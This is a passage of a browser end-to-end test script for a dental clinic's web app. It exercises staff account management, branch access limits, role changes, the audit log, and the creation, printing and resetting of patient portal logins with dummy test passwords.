  assert.ok(await p4.locator('a:has-text("Open")').count());
});

// ------------------------------------------------------------- patient portal
const p5 = await newPage({ width: 390, height: 844 });
await step('patient portal on a phone: complaint goes to Dr. Ali', async () => {
  await p5.goto(BASE + '#/login/patient');
  await p5.click('.demo-accounts button');
  await p5.waitForSelector('h1:has-text("Hello")');
  await shot(p5, '09-portal-mobile');
  await p5.click('button:has-text("Report / complain")');
  await p5.fill('.modal input', 'Waiting time');
  await p5.fill('.modal textarea', 'Waited too long');
  await p5.click('.modal button:has-text("Send to Dr. Ali")');
  await p5.waitForSelector('.toast:has-text("Sent")');
});
await step('sample patient account opens without a login and shows photos, dues and a reply', async () => {
  await p5.goto(BASE + '#/');
  await p5.click('a:has-text("See a sample patient account")');
  await p5.waitForSelector('.sample-banner');
  await p5.waitForSelector('h1:has-text("Hello")');
  assert.equal(await p5.locator('.photo-grid img').count(), 2, 'two sample photos');
  assert.ok(await p5.locator('.alert-info:has-text("Your next appointment")').count(), 'next appointment');
  assert.ok(await p5.locator('text=Reply from the clinic').count(), 'reply shown');
  assert.ok(await p5.locator('button:has-text("Rate this visit")').count(), 'rating button is live');
  await shot(p5, '09b-portal-sample');
});
const p7 = await newPage();
await step('Dr. Ali creates a staff login with a password, then changes its email and password', async () => {
  await loginAs(p7, 'Dr. Ali Rashid');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.getByRole('button', { name: 'New staff account' }).click();
  const m = p7.locator('.modal');
  await m.getByPlaceholder('Full name').fill('Test Reception');
  await m.locator('input[type=email]').fill('test.reception@dralirashid.com');
  const pw = await m.locator('input[autocomplete=new-password]').inputValue();
  assert.match(pw, /^[A-Z][a-z]{4}-\d{4}$/);
  await m.getByRole('button', { name: 'Create account' }).click();
  await p7.waitForSelector('td:text("test.reception@dralirashid.com")');
  await p7.locator('tr', { hasText: 'test.reception@dralirashid.com' }).getByRole('button', { name: /^Login and password/ }).click();
  const lm = p7.locator('.modal');
  await lm.locator('input[type=email]').fill('dha.reception@dralirashid.com');
  await lm.getByLabel(/Set a new password/).check();
  await lm.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('td:text("dha.reception@dralirashid.com")');
  assert.equal(await p7.locator('td:text("test.reception@dralirashid.com")').count(), 0);
  assert.ok(await p7.locator('th:text("Last login")').count(), 'last login column');
  assert.ok(await p7.locator('tr:has-text("Dr. Ali Rashid") td:has-text("Never")').count() === 0, "Dr. Ali's own login is recorded");
  await shot(p7, '11-staff-accounts');
});
// The Branches dialog on Admin → Staff accounts. dha.reception (made above) starts with no limit, so it shows All.
const branchLogin = 'dha.reception@dralirashid.com';
const branchesCell = (page, login) => page.locator('tr', { hasText: login }).locator('td').nth(3);
const openBranches = async (page, login) => { await page.locator('tr', { hasText: login }).getByRole('button', { name: /^Branches/ }).click(); return page.locator('.modal'); };
// Switch the DHA branch off (or on) in Clinic setup, then come back to Staff accounts.
const switchDha = async (open) => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.waitForSelector('h2:text("Treatments")');
  await p7.getByRole('button', { name: 'Edit DHA Karachi', exact: true }).click();
  const bm = p7.locator('.modal');
  const box = bm.getByLabel('Open (shown on the website)');
  if (open) await box.check(); else await box.uncheck();
  await bm.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.waitForSelector(`tr:has-text("${branchLogin}")`);
};
await step('Dr. Ali changes the branches a staff member works at, and is asked before a limit is lifted', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  assert.equal(await p7.locator('tr', { hasText: 'Dr. Ali Rashid' }).getByRole('button', { name: /^Branches/ }).count(), 0, "no Branches button on the admin's own row");
  // An account with no limit starts on All branches; ticking branches clears it.
  let m = await openBranches(p7, branchLogin);
  assert.ok(await m.getByLabel('All branches', { exact: true }).isChecked(), 'no limit starts on All branches');
  // The dialog says what a limit really covers: the Aaj ki List, invoices and payments, not patient records.
  const intro = await m.innerText();
  assert.match(intro, /Aaj ki List, invoices and payments of these branches/);
  assert.match(intro, /patient records are shared by every branch/);
  assert.doesNotMatch(intro, /enter patients/, 'it must not promise that patients are hidden');
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'ticking a branch clears All');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi, Islamabad")`);
  // Reopened, the dialog is ticked from the saved account.
  m = await openBranches(p7, branchLogin);
  assert.ok(await m.getByLabel('DHA Karachi', { exact: true }).isChecked() && await m.getByLabel('Islamabad', { exact: true }).isChecked(), 'ticked from the saved branches');
  assert.ok(!(await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).isChecked()), 'other branches stay unticked');
  // Unticking the last branch means every branch again. That lifts a limit, so Save asks for a tick first.
  const sure = m.getByLabel(/may see every branch/);
  assert.ok(!(await sure.isVisible()), 'no question while the account stays limited');
  await m.getByLabel('DHA Karachi', { exact: true }).uncheck();
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  assert.ok(await m.getByLabel('All branches', { exact: true }).isChecked(), 'clearing the last branch falls back to All');
  assert.ok(await sure.isVisible(), 'lifting the limit asks for a tick');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.locator('[data-field-error]').waitFor();
  assert.ok(await m.isVisible(), 'the dialog stays open until the tick is given');
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'DHA Karachi, Islamabad', 'nothing saved without the tick');
  await sure.check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
  // Setting a limit on an account that had none is never asked about.
  m = await openBranches(p7, branchLogin);
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).check();
  assert.ok(!(await sure.isVisible()), 'no question when a limit is set');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Gulshan (RJ Mall)")`);
});
await step('A switched-off branch is kept when branches are saved, and Save alone cannot lift the limit', async () => {
  // dha.reception works at Gulshan only (set above). Move them to DHA only, then switch DHA off in Clinic setup.
  let m = await openBranches(p7, branchLogin);
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).uncheck();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi")`);
  await switchDha(false);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), '1 switched-off branch', 'a switched-off branch is counted, not left blank');
  m = await openBranches(p7, branchLogin);
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'an account limited to a switched-off branch is not shown as All');
  assert.equal(await m.getByLabel('DHA Karachi', { exact: true }).count(), 0, 'a switched-off branch is not offered');
  assert.match(await m.innerText(), /Also kept: 1 switched-off branch/);
  // Pressing Save without a change must not turn the account into All branches.
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Nothing changed")');
  assert.ok(await m.isVisible(), 'the dialog stays open');
  // Adding a branch keeps the switched-off one.
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()));
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Islamabad, 1 switched-off branch")`);
  // Switch DHA back on: the kept branch is shown by name again. Then put the account back to All.
  await switchDha(true);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'Islamabad, DHA Karachi');
  m = await openBranches(p7, branchLogin);
  await m.getByLabel('All branches', { exact: true }).check();
  await m.getByLabel(/may see every branch/).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
});
await step('"All branches" can be chosen for an account that still has a switched-off branch', async () => {
  // dha.reception is on All (end of the step above). Limit them to DHA, switch DHA off, then choose All branches.
  let m = await openBranches(p7, branchLogin);
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi")`);
  await switchDha(false);
  m = await openBranches(p7, branchLogin);
  const allBox = m.getByLabel('All branches', { exact: true });
  const sure = m.getByLabel(/may see every branch/);
  const keptNote = m.getByText(/Also kept: 1 switched-off branch/);
  assert.ok(!(await allBox.isChecked()) && await keptNote.isVisible(), 'limited to a switched-off branch: All is off and the kept note shows');
  // Clearing the last tick keeps the limit (nothing else to fall back to), as before.
  await m.getByLabel('Islamabad', { exact: true }).check();
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  assert.ok(!(await allBox.isChecked()), 'a switched-off branch is kept: clearing the last tick does not turn All on');
  // An explicit tick on All stands: it used to clear itself again straight away.
  await allBox.check();
  assert.ok(await allBox.isChecked(), 'All branches stays ticked');
  assert.ok(await sure.isVisible(), 'lifting the limit still asks');
  assert.ok(!(await keptNote.isVisible()), 'the kept note goes while All is chosen');
  // Changing their mind: a branch tick takes All off again and brings the note back.
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await allBox.isChecked()) && await keptNote.isVisible() && !(await sure.isVisible()), 'ticking a branch undoes All');
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  await allBox.check();
  // Save alone does not lift the limit; the tick does, and the switched-off branch is let go with it.
  await m.getByRole('button', { name: 'Save' }).click();
  await m.locator('[data-field-error]').waitFor();
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), '1 switched-off branch', 'nothing saved without the tick');
  await sure.check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
  await switchDha(true);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'All', 'the account is on All, with no limit left behind');
});
await step('An account limited to no branch is shown as locked out and can be repaired from the dialog', async () => {
  // The branches form cannot make this; a mistyped SQL fix can. Create one directly through the demo data layer.
  await p7.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.createStaff({ full_name: 'Locked Out Test', email: 'locked.out@dralirashid.com', role: 'front_desk', branch_ids: [], restrict_to_branches: true });
  });
  await p7.goto(BASE + '#/staff/admin?tab=access');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  const login = 'locked.out@dralirashid.com';
  await p7.waitForSelector(`tr:has-text("${login}")`);
  assert.equal((await branchesCell(p7, login).textContent()).trim(), 'None (locked out)');
  const m = await openBranches(p7, login);
  assert.match(await m.innerText(), /cannot open any patient list/);
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'not shown as All');
  // Save alone changes nothing: it must not quietly give every branch.
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Nothing changed")');
  assert.equal((await branchesCell(p7, login).textContent()).trim(), 'None (locked out)');
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${login}") td:text-is("Gulshan (RJ Mall)")`);
});
await step('A user manager has no Branches button on their own row, and the data layer refuses it too', async () => {
  // Give the sample coordinator the "manage staff accounts" permission for this person only, then sign in as them.
  const setManage = (on) => p7.evaluate(async (v) => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-coord', 'users.manage', v); }, on);
  const logOut = async () => { await p7.getByRole('button', { name: 'Try another role' }).click(); await p7.waitForSelector('.door'); };
  await setManage(true);
  try {
    await logOut();
    await loginAs(p7, 'Clinic coordinator');
    await p7.goto(BASE + '#/staff/admin?tab=staff');
    await p7.waitForSelector('tr:has-text("Clinic coordinator (sample)")');
    const branchButtons = (name) => p7.locator('tr', { hasText: name }).getByRole('button', { name: /^Branches/ }).count();
    assert.equal(await branchButtons('Clinic coordinator (sample)'), 0, 'not on their own row');
    assert.equal(await branchButtons('Dr. Ali Rashid'), 0, 'not on the admin row');
    assert.equal(await branchButtons('Front desk (Gulshan)'), 1, "still on other people's rows");
    const tryChange = (id) => p7.evaluate(async (who) => {
      const { state } = await import('/js/state.js');
      try { await state.data.updateStaffBranches(who, [1]); return 'saved'; } catch (e) { return e.message; }
    }, id);
    assert.match(await tryChange('s-coord'), /cannot change your own/);
    assert.match(await tryChange('s-admin'), /Only admin/);
    // The same for the Role button: not on their own row nor an admin's, and the data layer refuses it as the database does.
    const roleButtons = (name) => p7.locator('tr', { hasText: name }).getByRole('button', { name: /^Role,/ }).count();
    assert.equal(await roleButtons('Clinic coordinator (sample)'), 0, 'no Role button on their own row');
    assert.equal(await roleButtons('Dr. Ali Rashid'), 0, 'no Role button on the admin row');
    assert.equal(await roleButtons('Front desk (Gulshan)'), 1, "Role button on other people's rows");
    const tryRole = (id, role) => p7.evaluate(async ([who, to]) => {
      const { state } = await import('/js/state.js');
      try { await state.data.updateStaffRole(who, to); return 'saved'; } catch (e) { return e.message; }
    }, [id, role]);
    assert.match(await tryRole('s-coord', 'front_desk'), /cannot change your own/);
    assert.match(await tryRole('s-admin', 'front_desk'), /Only admin can change an admin/);
    assert.match(await tryRole('s-fd-gul', 'admin'), /Only admin can create or promote/);
    assert.equal(await tryRole('s-fd-gul', 'assistant'), 'saved', 'a user manager may change someone else\'s role');
    assert.equal(await tryRole('s-fd-gul', 'front_desk'), 'saved');
  } finally {
    // Pass or fail, the steps after this one need Dr. Ali signed in and the coordinator back to normal.
    if (await p7.getByRole('button', { name: 'Try another role' }).count()) await logOut();
    await loginAs(p7, 'Dr. Ali Rashid');
    await setManage(null);
  }
});
await step('Dr. Ali changes the role of a staff member (front desk to assistant), the table follows, personal access stays', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.waitForSelector(`tr:has-text("${branchLogin}")`);
  const row = p7.locator('tr', { hasText: branchLogin });
  const roleCell = () => row.locator('td').nth(2);
  const idOf = () => p7.evaluate(async (email) => { const { state } = await import('/js/state.js'); return (await state.data.staffList()).find((s) => s.email === email).id; }, branchLogin);
  // The Role button sits next to Branches, on exactly the rows that have Branches (not the admin row, not your own).
  assert.equal(await p7.getByRole('button', { name: /^Role,/ }).count(), await p7.getByRole('button', { name: /^Branches,/ }).count(), 'Role is shown wherever Branches is');
  assert.equal(await p7.locator('tr', { hasText: 'Dr. Ali Rashid' }).getByRole('button', { name: /^Role,/ }).count(), 0, 'no Role button on the admin row');
  const labels = await row.getByRole('button').allInnerTexts();
  assert.equal(labels.indexOf('Role'), labels.indexOf('Branches') + 1, 'Role comes right after Branches');
  assert.equal((await roleCell().textContent()).trim(), 'Front desk');
  // A personal access tick set before the change must still be there after it.
  const id = await idOf();
  await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); await state.data.setOverride(who, 'billing.view', true); }, id);
  try {
    let m;
    const openRole = async () => { await row.getByRole('button', { name: /^Role,/ }).click(); m = p7.locator('.modal'); return m.locator('select'); };
    let sel = await openRole();
    assert.deepEqual(await sel.locator('option').allInnerTexts(), ['Front desk', 'Assistant', 'Doctor', 'Clinic coordinator', 'Accountant'], 'the five working roles, never Admin');
    assert.equal(await sel.inputValue(), 'front_desk', 'pre-selected with the current role');
    assert.match(await m.innerText(), /Their menus and permissions change to the Front desk ones; personal access ticks stay/);
    // Save with the current role changes nothing and says so.
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector('.toast:has-text("Nothing changed")');
    assert.ok(await m.isVisible(), 'the dialog stays open');
    assert.equal((await roleCell().textContent()).trim(), 'Front desk');
    await sel.selectOption('assistant');
    assert.match(await m.innerText(), /Their menus and permissions change to the Assistant ones; personal access ticks stay/, 'the note names the chosen role');
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Assistant")`);
    await p7.waitForSelector('.toast:has-text("is now Assistant")');
    assert.equal(await p7.locator('.modal').count(), 0, 'the dialog closes after saving');
    const stays = await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); const g = await state.data.permissionGrid(); return g.overrides[who]?.['billing.view']; }, id);
    assert.equal(stays, true, 'the personal access tick stayed through the role change');
    // Reopened, the dialog is pre-selected from the saved role. Put the account back to front desk.
    sel = await openRole();
    assert.equal(await sel.inputValue(), 'assistant', 'pre-selected from the saved role');
    await sel.selectOption('front_desk');
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Front desk")`);
  } finally {
    await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); await state.data.setOverride(who, 'billing.view', null); }, id);
  }
});
await step('Admin → Audit log lists sign-ins', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=audit');
  await p7.waitForSelector('h2:text("Logins")');
  await p7.waitForSelector('table.list tr:has-text("Dr. Ali Rashid")');
  assert.ok(await p7.locator('h2:text("Recent changes")').count());
});

// ------------------------------------------------------------- portal login made at the clinic
// The demo keeps its "login server" in the page's memory, so the staff member and the patient share one page (hash changes only).
const pl = await newPage();
let slip = {};
// Logging out finishes by sending the page to the home page: wait for that, or it lands on top of whatever the test opened next.
const logOut = async ({ staff = false } = {}) => {
  if (staff) await pl.getByRole('button', { name: /^Account menu/ }).click();
  await pl.getByRole('button', { name: 'Log out' }).click();
  await pl.waitForFunction(() => location.hash === '#/');
  await pl.waitForSelector('.door');
};
const openPatient = async (name) => {
  await pl.goto(BASE + `#/staff/patients?q=${encodeURIComponent(name)}`);
  await pl.locator('table.list tbody tr', { hasText: name }).locator('a').first().click();
  await pl.waitForSelector(`h1:has-text("${name}")`);
};
await step('portal login buttons: "Create portal login" for a patient with none, the email invitation only when there is an email', async () => {
  await loginAs(pl, 'Dr. Ali Rashid');
  await openPatient('Hamza Qureshi'); // no email on file
  await pl.getByRole('button', { name: 'Create portal login' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Invite to patient portal' }).count(), 0, 'no email: nothing to invite');
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await openPatient('Zainab Rizvi'); // has an email
  await pl.getByRole('button', { name: 'Create portal login' }).waitFor();
  await pl.getByRole('button', { name: 'Invite to patient portal' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await openPatient('Areeba Siddiqui'); // already has a login with her own email
  await pl.waitForSelector('h1:has-text("Areeba Siddiqui")');
  assert.equal(await pl.getByRole('button', { name: 'Create portal login' }).count(), 0);
  await pl.locator('.portal-login-line', { hasText: 'Portal login: own email (invited)' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Reset portal password' }).count(), 0, 'a login with the patient\'s own email is reset by email, not here');
});
await step('staff create a portal login: the username, an easy password, and a login slip that prints on one small page', async () => {
  await openPatient('Hamza Qureshi');
  await pl.getByRole('button', { name: 'Create portal login' }).click();
  const m = pl.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), 'hamzaqureshi-9812@dralirashid.com');
  const generated = await m.getByLabel('Password').inputValue();
  assert.match(generated, /^[a-hj-km-np-z]{3,5}-[a-hj-km-np-z]{3,5}-[a-hj-km-np-z]{3,5}-[2-9]{4}$/, 'three short words and four digits, nothing that can be misread');
  await m.getByRole('button', { name: 'New one' }).click();
  assert.notEqual(await m.getByLabel('Password').inputValue(), generated, '"New one" gives another');
  // Copy is for the username only: the slip is how the password is handed over (a copied password stays in the clipboard history of the front desk).
  assert.equal(await m.getByRole('button', { name: 'Copy' }).count(), 1, 'one Copy button');
  assert.equal(await m.locator('.inline:has(input[readonly]) button', { hasText: 'Copy' }).count(), 1, 'and it is the username\'s');
  assert.deepEqual(await m.locator('.inline:has(input[autocomplete=off]) button').allInnerTexts(), ['New one'], 'the password box has only "New one"');
  await m.getByLabel('Password').fill('short');
  await m.getByRole('button', { name: 'Create login' }).click();
  await m.locator('.field-error', { hasText: 'at least 10 characters' }).waitFor();
  await m.getByLabel('Password').fill('0300123456789');
  await m.getByRole('button', { name: 'Create login' }).click();
  await m.locator('.field-error', { hasText: 'only digits' }).waitFor();
  slip = { username: 'hamzaqureshi-9812@dralirashid.com', password: 'sunny-grape-4827' };
  await m.getByLabel('Password').fill(slip.password);
  await m.getByRole('button', { name: 'Create login' }).click();
  await pl.waitForSelector('.login-slip');
  const text = await pl.locator('.login-slip').innerText();
  for (const part of ['Dr. Ali Rashid\'s Dental Clinic', 'www.dralirashid.com', slip.username, slip.password, 'Hamza Qureshi', 'Mr# 9812', 'You will be asked to choose your own password the first time you log in']) assert.ok(text.includes(part), `slip shows "${part}"`);
  assert.equal(await pl.locator('.modal').count(), 1, 'only the slip dialog is open');
  await shot(pl, '15-login-slip');
  // Print: the slip is the only thing on the paper, and it is one page.
  await pl.evaluate(() => { window.__print = []; window.print = () => { window.__print.push({ printing: document.body.classList.contains('printing'), areas: [...document.querySelectorAll('.print-area')].map((a) => a.className) }); window.dispatchEvent(new Event('afterprint')); }; });
  await pl.getByRole('button', { name: 'Print login slip' }).click();
  const printed = await pl.evaluate(() => ({ calls: window.__print, still: document.body.classList.contains('printing') }));
  assert.equal(printed.calls.length, 1);
  assert.equal(printed.calls[0].printing, true, 'the print rules were switched on for the slip');
  assert.deepEqual(printed.calls[0].areas, ['login-slip print-area'], 'only the slip is a print area');
  assert.equal(printed.still, false, 'and switched off again afterwards');
  const pdf = await pl.pdf({ preferCSSPageSize: true, printBackground: true });
  const pages = (pdf.toString('latin1').match(/\/Type\s*\/Page[^s]/g) || []).length;
  assert.equal(pages, 1, 'the slip prints on one page');
  const box = pdf.toString('latin1').match(/MediaBox\s*\[\s*0\s+0\s+([\d.]+)\s+([\d.]+)\s*\]/);
  assert.ok(box && Math.abs(Number(box[1]) - 297.6) < 3 && Math.abs(Number(box[2]) - 419.5) < 3, `the page is A6 (105 x 148 mm), not ${box?.slice(1, 3).join(' x ')}`);
  await pl.getByRole('button', { name: 'Close' }).first().click();
  await pl.waitForSelector('h1:has-text("Hamza Qureshi")');
  await pl.getByRole('button', { name: 'Reset portal password' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Create portal login' }).count(), 0, 'the login exists now');
  // The password was shown only in the dialog and on the slip: it is not left anywhere on the page.
  assert.equal((await pl.locator('main, #app').first().innerText()).includes(slip.password), false);
  // The patient record now says which login it is (and the username to tell the patient again without a reset).
  await pl.locator('.portal-login-line', { hasText: 'Portal login: ' + slip.username }).waitFor();
});
await step('the Portal login line says "could not check" with a retry when the function cannot be asked, and "Update the admin-users function first." when it is old', async () => {
  const stub = (message) => pl.evaluate(async (m) => {
    const { state } = await import('/js/state.js');
    window.__realInfo ||= state.data.portalLoginInfo;
    state.data.portalLoginInfo = m === null ? window.__realInfo : async () => { throw new Error(m); };
  }, message);
  await stub('Update the admin-users function first.'); // what the website says when the function does not know the action yet
  await openPatient('Hamza Qureshi');
  const line = pl.locator('.portal-login-line');
  await line.getByText('could not check').waitFor();
  assert.match(await line.innerText(), /Update the admin-users function first\./);
  assert.equal(await pl.getByRole('button', { name: 'Reset portal password' }).count(), 0, 'no reset button on a login that could not be checked');
  await stub(null); // the function answers again
  await line.getByRole('button', { name: 'Try again' }).click();
  await line.getByText(slip.username).waitFor();
  await pl.getByRole('button', { name: 'Reset portal password' }).waitFor();
  expectErrors(/Update the admin-users function first/);
});
await step('the patient logs in with just the short username, must choose their own password first, then lands in the portal', async () => {
  await logOut({ staff: true });
  await pl.setViewportSize({ width: 390, height: 844 });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').waitFor();
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.locator('input[type=password]').fill('not-the-password-1');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'username (or email) and password do not match' }).waitFor();
  await form.locator('input[name=username]').fill('  HamzaQureshi-9812 ');
  await form.locator('input[type=password]').fill(slip.password);
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Choose your own password")');
  assert.equal(await pl.locator('h1:has-text("Hello")').count(), 0, 'nothing of the portal before the new password');
  assert.equal(await pl.locator('.photo-grid, .stat-row').count(), 0);
  await shot(pl, '16-choose-password');
  const next = pl.locator('input[autocomplete=new-password]');
  const save = pl.getByRole('button', { name: 'Save my password' });
  await next.nth(0).fill('abc');
  await next.nth(1).fill('abc');
  await save.click();
  await pl.locator('.field-error', { hasText: 'at least 8 characters' }).waitFor();
  await next.nth(0).fill('my-own-pass-77');
  await next.nth(1).fill('my-own-pass-78');
  await save.click();
  await pl.locator('.field-error', { hasText: 'two passwords are different' }).waitFor();
  await next.nth(0).fill(slip.password);
  await next.nth(1).fill(slip.password);
  await save.click();
  await pl.locator('[role=alert]', { hasText: 'different from your current one' }).first().waitFor();
  await next.nth(0).fill('my-own-pass-77');
  await next.nth(1).fill('my-own-pass-77');
  await save.click();
  await pl.waitForSelector('h1:has-text("Hello, Hamza")');
  await pl.getByRole('button', { name: 'Change password' }).waitFor();
  await shot(pl, '17-portal-after-first-login');
});
await step('the patient can change the password later from the portal menu, and the old one stops working', async () => {
  await pl.getByRole('button', { name: 'Change password' }).click();
  const dlg = pl.locator('.modal');
  await dlg.getByLabel('New password').fill('later-pass-4455');
  await dlg.getByLabel('Type it again').fill('later-pass-9999');
  await dlg.getByRole('button', { name: 'Save password' }).click();
  await dlg.locator('.field-error', { hasText: 'two passwords are different' }).waitFor();
  await dlg.getByLabel('New password').fill('later-pass-4455');
  await dlg.getByLabel('Type it again').fill('later-pass-4455');
  await dlg.getByRole('button', { name: 'Save password' }).click();
  await pl.waitForSelector('.toast:has-text("Your password has been changed")');
  await logOut();
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(slip.username); // the whole address works too
  await form.locator('input[type=password]').fill('my-own-pass-77');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'do not match' }).waitFor();
  await form.locator('input[type=password]').fill('later-pass-4455');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Hello, Hamza")'); // no "choose a password" screen again
  assert.equal(await pl.locator('h1:has-text("Choose your own password")').count(), 0);
});
await step('"Forgot password" for a clinic username says to ask the clinic (no email); a staff address is told the staff way', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('.field-error', { hasText: 'Type your username or email address first' }).waitFor();
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('p.muted', { hasText: 'Ask the clinic to reset your password' }).waitFor();
  await form.locator('input[name=username]').fill('someone@example.com');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('.field-error', { hasText: 'Something went wrong' }).waitFor(); // a real email goes to the email reset (the demo has none, so it fails the way any failed reset does)
});
await step('the patient login page points to the slip and to the clinic, for the hint and for "Forgot password" (WhatsApp link included)', async () => {
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').waitFor();
  const text = await form.innerText();
  assert.match(text, /Use the username on the slip the clinic gave you\. Patients who were invited by email use that email address\./);
  assert.doesNotMatch(text, /If you gave the clinic your email address/, 'no longer sends a clinic-made login to the real email');
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  const note = form.locator('p.muted', { hasText: 'Ask the clinic to reset your password' });
  await note.waitFor();
  const wa = note.getByRole('link', { name: /message the clinic on WhatsApp/ });
  assert.match(await wa.getAttribute('href'), /^https:\/\/wa\.me\/92\d{10}\?text=/, 'the clinic\'s WhatsApp chat');
  assert.equal(await wa.getAttribute('target'), '_blank');
  assert.match(await wa.getAttribute('rel'), /noopener/);
  // A real email: the reset email goes out (stand-in here), and the note says what to do if the login came from the clinic.
  await pl.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.sendPasswordReset = async () => {}; });
  await form.locator('input[name=username]').fill('hamza@example.com');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  const emailNote = form.locator('p.muted', { hasText: 'a link to set a new password is on its way' });
  await emailNote.waitFor();
  assert.match(await emailNote.innerText(), /If the clinic gave you a username on a slip, no link will come: use that username here instead, or message the clinic on WhatsApp/);
  assert.equal(await emailNote.getByRole('link', { name: /WhatsApp/ }).count(), 1);
});
await step('staff reset the password of a login made at the clinic: same username, a new slip, and the patient must choose again', async () => {
  await pl.setViewportSize({ width: 1366, height: 860 });
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  await openPatient('Hamza Qureshi');
  await pl.getByRole('button', { name: 'Reset portal password' }).click();
  const m = pl.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), slip.username);
  // Honest about what a reset does: it does not end a session that is already open.
  const said = await m.innerText();
  assert.match(said, /Saving signs the patient out everywhere: the old password stops working at once/);
  assert.doesNotMatch(said, /stops working as soon as you save/);
  slip.password = 'peach-zebra-5936';
  await m.getByLabel('Password').fill(slip.password);
  await m.getByRole('button', { name: 'Reset password' }).click();
  await pl.waitForSelector('.login-slip');
  assert.ok((await pl.locator('.login-slip').innerText()).includes(slip.password));
